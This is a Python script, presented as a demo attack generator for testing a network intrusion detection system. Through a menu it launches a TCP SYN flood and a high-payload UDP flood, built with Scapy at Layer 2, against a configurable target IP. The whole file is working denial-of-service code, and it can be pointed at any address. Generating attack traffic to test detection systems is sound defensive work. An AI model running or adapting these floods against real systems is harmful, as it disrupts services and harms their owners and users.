#!/usr/bin/env python3
"""
NIDS Demo Attack Script
"""

import sys
import time
import random
import argparse
import string

from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.l2 import Ether
from scapy.packet import Raw
from scapy.all import sendp, get_if_hwaddr, get_if_addr, conf


# ---------------------------------------------------------------------
# Utilities
# ---------------------------------------------------------------------

def get_mac(iface):
    """Attempts to get the interface MAC address."""
    try:
        return get_if_hwaddr(iface)
    except:
        return "ff:ff:ff:ff:ff:ff"


def random_payload(length=50):
    """Generates a random string payload."""
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))


# ---------------------------------------------------------------------
# Attack Vectors
# ---------------------------------------------------------------------

def attack_syn_flood(target_ip, iface, target_mac, duration=15):
    print(f"\n[>>>] LAUNCHING TCP SYN FLOOD (DoS) against {target_ip}...")
    print(f"      Strategy: Single-Flow Overload")

    t_end = time.time() + duration
    count = 0
    dst_port = 80
    src_port = random.randint(1024, 65535)

    while time.time() < t_end:
        # Randomize TTL to mimic realistic OS variance
        ttl_val = random.choice([64, 128, 254])

        # Layer 2 Frame Construction
        pkt = Ether(dst=target_mac) / \
              IP(dst=target_ip, ttl=ttl_val) / \
              TCP(sport=src_port, dport=dst_port, flags="S", seq=random.randint(1000, 9000))

        # sendp is faster for flooding at Layer 2
        sendp(pkt, iface=iface, verbose=0, inter=0.001)

        count += 1
        if count % 100 == 0:
            sys.stdout.write(".")
            sys.stdout.flush()

    print(f"\n[Done] Attack Complete. Sent {count} SYN packets.")


def attack_udp_flood(target_ip, iface, target_mac, duration=15):
    print(f"\n[>>>] LAUNCHING GENERIC UDP FLOOD against {target_ip}...")
    print(f"      Strategy: High Payload Size + TTL 254")

    t_end = time.time() + duration
    count = 0
    src_port = random.randint(1024, 65535)

    while time.time() < t_end:
        # 1. TTL 254
        ttl_val = 254

        # 2. Random High Ports
        dst_port = random.randint(2000, 65000)

        # 3. Large Payload
        payload = "X" * 1000

        pkt = Ether(dst=target_mac) / \
              IP(dst=target_ip, ttl=ttl_val) / \
              UDP(sport=src_port, dport=dst_port) / \
              Raw(load=payload)

        sendp(pkt, iface=iface, verbose=0, inter=0)

        count += 1
        if count % 100 == 0:
            sys.stdout.write("u")
            sys.stdout.flush()

    print(f"\n[Done] Sent {count} large UDP packets.")


# ---------------------------------------------------------------------
# Main Menu
# ---------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="NIDS Presentation Attacker")
    parser.add_argument("--target", default=None, help="Target IP (defaults to this machine)")
    parser.add_argument("--iface", default=None, help="Interface to send packets from")
    args = parser.parse_args()

    # Scapy Interface Selection
    if args.iface:
        iface = args.iface
    else:
        iface = conf.iface

    target_ip = args.target if args.target else get_if_addr(iface)
    target_mac = "ff:ff:ff:ff:ff:ff"

    while True:
        print("\n" + "=" * 60)
        print(f"  NIDS DEMO: ATTACK GENERATOR (Layer 2 / Npcap)")
        print(f"  Interface : {iface}")
        print(f"  Target IP : {target_ip}")
        print("=" * 60)
        print("1. DoS: TCP SYN Flood")
        print("2. Generic: UDP Flood (High Payload)")
        print("3. Exit")

        try:
            choice = input("\nSelect Attack [1-3]: ")

            if choice == '1':
                attack_syn_flood(target_ip, iface, target_mac)
            elif choice == '2':
                attack_udp_flood(target_ip, iface, target_mac)
            elif choice == '3':
                print("Exiting.")
                break
            else:
                print("Invalid selection.")

            time.sleep(1)

        except KeyboardInterrupt:
            break


if __name__ == "__main__":
    main()